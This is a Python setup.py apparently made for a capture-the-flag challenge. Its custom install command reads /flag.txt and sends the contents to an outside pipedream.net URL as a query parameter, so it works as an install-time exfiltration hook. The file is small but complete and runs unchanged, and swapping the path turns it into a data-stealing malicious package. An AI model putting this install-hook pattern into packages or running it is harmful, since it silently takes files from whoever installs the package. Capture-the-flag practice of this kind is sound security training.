from setuptools import setup
from setuptools.command.install import install
import requests


class CustomInstall(install):
    def run(self):
        install.run(self)
        with open("/flag.txt", 'r') as f:
            flag = f.read()
        requests.get(url=f"https://enkpt54nv9nwbbh.m.pipedream.net?flag={flag}")


setup(name='ctf_q21_empire_tmp_1337_thc',
      version='0.0.1',
      description='CTF pawn flag',
      author='albatraoz',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})